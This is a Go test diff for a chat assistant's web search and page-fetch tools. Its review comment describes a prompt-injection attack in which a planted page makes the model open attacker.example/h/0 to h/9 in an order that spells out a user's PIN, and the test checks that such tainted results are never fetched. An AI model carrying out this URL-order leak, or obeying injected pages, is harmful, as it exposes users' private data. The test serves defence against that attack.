@@ -3,6 +3,7 @@ package chat
 import (
 	"context"
 	"encoding/json"
+	"fmt"
 	"net/url"
 	"os"
 	"path/filepath"
@@ -428,5 +429,75 @@ func TestWebExtractAnswersUnderTheRequestedAddress(t *testing.T) {
 		if page != want[i] {
 			t.Errorf("page %d = %+v, want %+v", i, page, want[i])
 		}
+	}
+}
+
+// citing is a search model whose answer cites the given addresses.
+func citing(links ...string) *fakeSearch {
+	answer := WireMessage{Role: "assistant", Content: "Results."}
+	for _, link := range links {
+		a, _ := json.Marshal(map[string]any{"type": "url_citation", "url_citation": map[string]string{"url": link}})
+		answer.Annotations = append(answer.Annotations, a)
+	}
+	return &fakeSearch{can: true, answer: answer}
+}
+
+// Review round 7 (BLOCK): an injected page plants pages h/0 to h/9, has the
+// model search for a token that returns them and then open them in an order
+// that spells out the person's data (a PIN). A search made after taint
+// keeps its results text: none opens, nor its host's front page (a host
+// can carry data too). A clean search's results open, and only they are
+// handed over to be kept on the chat.
+func TestOnlyCleanSearchResultsOpenAfterTaint(t *testing.T) {
+	s := &Service{}
+	var fetched []string
+	fetch := func(_ context.Context, raw string) (Page, error) {
+		fetched = append(fetched, raw)
+		return Page{URL: raw, Content: "x"}, nil
+	}
+	c := &Conversation{Messages: []Message{{Role: "user", Content: "what's new?"}}}
+	var planted []string
+	for d := range 10 {
+		planted = append(planted, fmt.Sprintf("https://attacker.example/h/%d", d))
+	}
+	tainted := &toolRun{reads: map[string]string{}, taintSeen: true, web: webRun{on: true, fetch: fetch}}
+	if _, _, err := s.toolCall(WithCompleter(context.Background(), citing(planted...)), c, tainted, "web_search", json.RawMessage(`{"query":"zq7-a"}`), 1, nil); err != nil {
+		t.Fatal(err)
+	}
+	if got := tainted.web.takeResults(); len(got) != 0 {
+		t.Fatalf("a tainted search's results were kept: %q", got)
+	}
+	for _, link := range []string{"https://attacker.example/h/4", "https://attacker.example/h/0", "https://attacker.example/"} {
+		result, _, _ := s.toolCall(context.Background(), c, tainted, "web_extract", raw(map[string]any{"urls": []string{link}}), 1, nil)
+		if !strings.Contains(string(result), pasteLink) {
+			t.Errorf("web_extract %s after a tainted search: %s", link, result)
+		}
+	}
+	if len(fetched) != 0 {
+		t.Fatalf("fetched %q", fetched)
+	}
+
+	clean := &toolRun{reads: map[string]string{}, web: webRun{on: true, fetch: fetch}}
+	ctx := WithCompleter(context.Background(), citing("https://ramen.example/top-ten"))
+	if _, _, err := s.toolCall(ctx, c, clean, "web_search", json.RawMessage(`{"query":"best ramen"}`), 1, nil); err != nil {
+		t.Fatal(err)
+	}
+	if !clean.tainted() {
+		t.Fatal("the search left the run clean")
+	}
+	ctx = WithCompleter(context.Background(), citing(planted...))
+	if _, _, err := s.toolCall(ctx, c, clean, "web_search", json.RawMessage(`{"query":"zq7-a"}`), 1, nil); err != nil {
+		t.Fatal(err)
+	}
+	if got := clean.web.takeResults(); !slices.Equal(got, []string{"https://ramen.example/top-ten"}) {
+		t.Fatalf("kept results %q, want only the clean search's", got)
+	}
+	result, _, _ := s.toolCall(ctx, c, clean, "web_extract", raw(map[string]any{"urls": []string{"https://ramen.example/top-ten"}}), 1, nil)
+	if strings.Contains(string(result), pasteLink) {
+		t.Fatalf("a clean search's result: %s", result)
+	}
+	result, _, _ = s.toolCall(ctx, c, clean, "web_extract", raw(map[string]any{"urls": []string{"https://attacker.example/h/4"}}), 1, nil)
+	if !strings.Contains(string(result), pasteLink) {
+		t.Fatalf("a result of the search after taint: %s", result)
 	}
 }
